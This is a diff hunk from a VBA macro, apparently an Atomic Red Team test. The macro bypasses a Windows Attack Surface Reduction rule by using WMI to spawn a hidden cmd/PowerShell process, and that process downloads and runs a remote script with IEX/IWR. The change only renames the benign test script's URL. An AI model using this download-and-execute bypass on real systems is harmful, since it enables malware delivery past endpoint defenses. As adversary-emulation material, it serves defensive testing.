@@ -50,6 +50,6 @@ Sub ASR_bypass_create_child_process_rule5()
     Set objConfig = objStartup.SpawnInstance_
     objConfig.ShowWindow = HIDDEN_WINDOW
     Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
-    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail_benign.ps1')", Null, objConfig, intProcessID
+    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1')", Null, objConfig, intProcessID
 End Sub
 ```
